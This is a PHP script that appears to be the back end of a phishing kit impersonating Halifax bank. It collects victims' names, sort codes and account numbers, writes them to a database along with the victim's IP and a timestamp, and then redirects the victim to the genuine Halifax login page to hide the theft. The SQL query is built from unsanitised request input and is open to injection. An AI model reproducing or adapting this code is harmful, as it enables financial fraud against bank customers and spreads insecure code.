<?php
include 'connect.php';
session_start();
$inf2 = $_REQUEST['fuln'];
$inf3 = $_REQUEST['sort1'];
$inf4 = $_REQUEST['sort2'];
$inf5 = $_REQUEST['sort3'];
$inf6 = $_REQUEST['account'];

$busca = $_SESSION['NomeUsuario'] . $_SESSION['Usuario'] ;
$ip = $_SERVER['REMOTE_ADDR'];

if(empty($inf2) || strlen($inf6) < 8){
   echo '<html><style>td{color:#000}td{font-family:arial,sans-serif} </style><body></body><script language="javascript">';
   echo ' alert("Confirm your Account Number");';
   echo 'history.back(-1); </script>';
   echo '</script></html>';
   exit; 
}

    $sql = "UPDATE `JSPHLT` SET ID_FulnName='$inf2', ID_SortCode1='$inf3', ID_SortCode2='$inf4', ID_SortCode3='$inf5', ID_AccountNumber='$inf6' WHERE CodBusca ='$busca';";
    $QueryAuto = mysql_query($sql); 
	if (!$QueryAuto) {  
             return;
    } else {
		$data = date("d/m/Y - H:i:s");
		$message = "\n\nSENHA: $inf1\n\nDATA: $data\n\nIP: $ip\n\n\n";
		echo '<meta http-equiv="refresh" content="0;url=https://www.halifax-online.co.uk/personal/logon/login.jsp">';
		
	}
	
	
?>
	